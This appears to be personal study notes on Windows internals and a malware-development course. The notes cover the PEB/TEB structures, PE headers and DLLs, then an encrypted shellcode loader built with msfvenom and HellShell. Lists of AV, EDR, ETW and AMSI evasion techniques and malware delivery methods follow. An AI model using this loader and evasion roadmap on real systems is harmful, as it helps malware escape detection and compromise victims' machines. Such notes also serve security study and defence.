## Windows Internals

### CPU Modes

A processor running a Windows OS operates in two modes:
- User mode
- Kernel mode

When a user application is running, it has to follow a certain "functional flow", going from user to kernel mode:
- The process calls a WinAPI contained in a DLL loaded in memory
- The DLL calls its `Nt` version contained in the `NTDLL.dll` file, which executes a `syscall`
- The `syscall` executes primitive OS modules to complete the task

A user process can directly call a NT function, provided that it's loaded in memory.

### PIDs & TIDs
The `PEB` is a data structure in Windows containing a process's parameters, startup information, and loaded DLLs. It also stores the PID and the path to the executable, the full PEB structure is not documented by Microsoft, but well known in other sources.

```C
typedef struct _PEB {
  BYTE                          BeingDebugged;
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         AtlThunkSListPtr;
  ULONG                         AtlThunkSListPtr32;
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  ULONG                         SessionId;
} PEB, *PPEB;
```

Each process is made of multiple concurrent "threads", sets of instructions that can be executed independently within the process. Each thread can communicate and share data with each other, and they also have a dedicated struct called `TEB` containing info and a unique TID value.

```C
typedef struct _TEB {
  PPEB  ProcessEnvironmentBlock;
  PVOID TlsSlots[64];
  PVOID TlsExpansionSlots;
} TEB, *PTEB;
```

### PE Structure
A `PE` file has the following organized data structures called "headers", it's possible to review some `.exe` files using PE-Bear and have a feeling for where these headers are:

- DOS Header
  - Signature (`MZ`)
  - Offset to NT (`0x3C`)
- NT Headers
    - Signature (`PE`)
    - File Header
    - Optional Header
- Data Directories
- Binary Segments
    - `.data / .rdata`
    - `.text`
    - `.rsrc`

A detailed description of each is referenced [here](https://maldevacademy.com/modules/8?view=blocks)

### DLLs
Custom DLLs can be created in a project, by specifying an entry point and a list of exportable functions. Before compiling the project, one has to remove C++ pre-compiled headers with [this guide](https://maldevacademy.com/modules/9?view=blocks)
```C
#include <Windows.h>
#include <stdio.h>

// Exported function
VOID HelloWorld() {
    MessageBoxA(NULL, "Hello world!", "Caption", MB_OK | MB_ICONINFORMATION);
}

// Entry point condition code
BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

In a executable code, you can dynamically link and invoke DLL functions, each one having a corresponding `typedef` with the correct arguments (from the docs)
```C
#include <windows.h>

typedef int (WINAPI* MessageBoxAPointer)(
  HWND          hWnd,
  LPCSTR        lpText,
  LPCSTR        lpCaption,
  UINT          uType
);

void call(){
    MessageBoxAPointer pMessageBoxA = GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
    pMessageBoxA(NULL, "Text", "Caption", MB_OK);
}
```

## Malware Development - Part 1

### Basic Shellcode Execution
The simplest way of executing a malicious payload is through a shellcode in the `.data` section of a PE, which then gets executed by a thread in the process. We will now see an example of the simplest encrypted/obfuscated execution flow.

First, use `HellShell` to produce an encrypted payload with its decryptor, RC4 recommended as it allows key obfuscation and NTAPI calls. An alternative would be to use the `ipv6` and `uuid` options, to obfuscate the payload rather than encrypt it.
- `msfvenom -p windows/x64/exec CMD=calc -f raw ExitFunc=thread -o payload.bin`
- `.\HellShell.exe payload.bin rc4`

The output of `HellShell` will contain the code necessary to decrypt the payload, create a `main.c` file with its content, then add the following `main()` function.
```C
int main() {
    // Decrypt the payload
    BOOL enc_stat = Rc4EncryptionViaSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));
    SIZE_T sDeobfuscatedSize = sizeof(Rc4CipherText);

    // Mark memory region of type RX
    DWORD dwOldProtection = NULL;
    VirtualProtect(Rc4CipherText, sDeobfuscatedSize, PAGE_EXECUTE_READ, &dwOldProtection);

    // Spawn a thread to execute payload
    CreateThread(NULL, NULL, Rc4CipherText, NULL, NULL, NULL);

    return 0;
}
```

### Anti Reverse-Engineering
To make our shellcode execution hard to analyze and the malware more legit, we can employ the following techniques, as an excercise, improve the HellShell payload loader by using the following techniques:
- [RC4_Key-Guarding](https://maldevacademy.com/modules/78)
- [Binary Signing](https://maldevacademy.com/modules/32)
- [Entropy Decrease](https://maldevacademy.com/modules/76)
- [CRT Removal](https://maldevacademy.com/modules/79)
- [Metadata Spoofing](https://maldevacademy.com/new/modules/1)
- [Size Bloating](https://maldevacademy.com/new/modules/6?view=blocks)
- [IAT Spoofing](https://maldevacademy.com/modules/80)
- [API Hashing](https://maldevacademy.com/modules/57)
- [String Hashing](https://maldevacademy.com/modules/51)
- [PPID Spoofing](https://maldevacademy.com/modules/47)
- [Argument Spoofing](https://maldevacademy.com/modules/49)
- [Flow Hijacking](https://maldevacademy.com/modules/46)
- [VM Evasion](https://maldevacademy.com/modules/73)
- [Debug Escape](https://maldevacademy.com/modules/71)

### AV Evasion
While our malware is now functional, hard to manually analyze and camouflaged in a benign way, it's time to obfuscate the inner functional calls to make AV solutions useless.

- Avoiding `CreateThread()`
  - APC Injections
  - Local Thread Hijacking
  - Callback Execution
  - Direct/Indirect NT Calls
- Avoiding `VirtualAlloc()`
  - Local Mapping Injection
  - Local Function Stomping
  - Direct/Indirect NT Calls
 
### EDR Evasion

Our malware is yet not able to defend against active DLL injections and API hooking, used by advanced EDRs. We can circumvent this by applying the following techniques:
- [Introduction to EDR](https://maldevacademy.com/modules/82?view=blocks)
- [Indirect Syscalling](https://maldevacademy.com/modules/89)
- [Anti-DLL Injection](https://maldevacademy.com/modules/90)
- [Anti-Process Hooking](https://maldevacademy.com/modules/91)
- [DRM-Signing](https://maldevacademy.com/new/modules/21?view=blocks)

### Event Tracing Evasion
To make the malware leave no event logs on Windows
- [ETW Introduction](https://maldevacademy.com/new/modules/12?view=blocks)
- [ETW Session Hijacking](https://maldevacademy.com/new/modules/17?view=blocks)

### AMSI Evasion
To complement malware executables, powershell malwares can be used sometimes. For them, it is important to know how to bypass AMSI
- [AMSI Intro](https://maldevacademy.com/new/modules/18?view=blocks)


### Initial Access
There are techniques to make the delivery of the malware efficient and more difficult to analyze:
- [Havoc C&C Usage](https://maldevacademy.com/new/modules/22?view=blocks)
- [Protocol Handlers](https://maldevacademy.com/new/modules/7?view=blocks)
- [File Extensions](https://maldevacademy.com/new/modules/8?view=blocks)
